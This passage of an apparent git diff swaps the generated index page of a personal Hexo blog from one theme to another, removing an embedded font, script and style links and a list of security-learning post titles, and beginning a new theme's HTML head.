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) format('woff2');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-</style><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><script src="https://cdn.bootcss.com/highlight.js/9.6.0/highlight.min.js" defer></script><script src="/js/paper.js" defer></script><script src="https://www.googletagmanager.com/gtag/js?id=xx-xxxxxxx-xx" async></script><script>window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
-gtag('config', 'xx-xxxxxxx-xx');</script><link rel="preload" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/github.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/github.min.css"><link rel="preload" href="https://fonts.googleapis.com/css?family=Abril+Fatface&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface&amp;display=swap"><meta name="generator" content="Hexo 6.0.0"></head><body><div class="mask-border"></div><div class="head"><div class="head__inner"><h1><a href="/">Talking to myself</a></h1><p></p></div></div><div class="paper-container"><div class="home-view"><div class="main"><div class="location-bar"><div class="line-1"><div class="horizontal-line" style="height: 3px"></div></div><div class="line-2"><div class="horizontal-line" style="height: 1px"></div></div><p class="text">首页</p><div class="switch-button"><input class="container_toggle" type="checkbox" id="switch" name="mode"><label for="switch">Toggle</label></div><div class="line-3"><div class="horizontal-line" style="height: 1px"></div></div></div><div class="main__2-col"><div class="posts"><div class="posts-item"><h2 class="posts-item__title"><a href="/2022/02/13/Drozer%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">Drozer安装与使用</a></h2><span class="post__date">2022-02-13</span><a href="/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"><span class="post__tags">#工具分享</span></a></div><div class="posts-item"><h2 class="posts-item__title"><a href="/2022/02/01/%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B%E7%AC%94%E8%AE%B0/">《区块链技术与应用》笔记</a></h2><span class="post__date">2022-02-01</span><a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"><span class="post__tags">#区块链</span></a></div><div class="posts-item"><h2 class="posts-item__title"><a href="/2022/01/27/%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">最近学习总结</a></h2><span class="post__date">2022-01-27</span></div><div class="posts-item"><h2 class="posts-item__title"><a href="/2022/01/18/Android%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Android安全学习</a></h2><span class="post__date">2022-01-18</span><a href="/tags/Android/"><span class="post__tags">#Android</span></a></div><div class="posts-item"><h2 class="posts-item__title"><a href="/2022/01/16/CORS%E5%AD%A6%E4%B9%A0/">CORS学习</a></h2><span class="post__date">2022-01-16</span></div><div class="posts-item"><h2 class="posts-item__title"><a href="/2021/12/16/WiFi%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/">WiFi无线安全</a></h2><span class="post__date">2021-12-16</span></div><div class="posts-item"><h2 class="posts-item__title posts-item__title--image"><a href="/2021/12/15/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/">灰袍推送Mark</a></h2><img class="posts-item__image" src="https://images.unsplash.com/photo-1639499063465-3e7159bd47b8?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=774&amp;q=80" alt="post image"><span class="post__date">2021-12-15</span></div><div class="posts-item"><h2 class="posts-item__title"><a href="/1985/10/26/hello-world/">Hello World</a></h2><span class="post__date">1985-10-26</span></div></div><div class="sidebar"><h2>Links</h2><div class="sidebar__link"><ul><li><a target="_blank" rel="noopener" href="https://github.com/wangmiao1214">Github</a></li><li><a target="_blank" rel="noopener" href="https://www.zhihu.com/people/chen-ai-luo-ding-92-85">知乎</a></li><li><a target="_blank" rel="noopener" href="https://unsplash.com/@wangmiao1214">Unsplash</a></li></ul></div><h2>Archives</h2><div class="sidebar__archives"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1985/">1985</a></li></ul></div><h2>Tags</h2><div class="sidebar__tags"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/" rel="tag">工具分享</a></li></ul></div></div></div><div class="horizontal-line" style="height: 1px"></div><div class="main__bottom"><div class="paginator"><span class="page-number current">1</span></div></div></div></div></div><div class="footer"><span>©️2019-2022 Designed By&nbsp;<strong><a target="_blank" rel="noopener" href="https://github.com/random-yang">RandomYang</a></strong> Powered By&nbsp;</span><strong><a target="_blank" rel="noopener" href="https://hexo.io">hexo</a></strong></div><div class="darkmode-mask" id="darkmode-mask"></div><div class="sidebar__button"></div></body></html>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
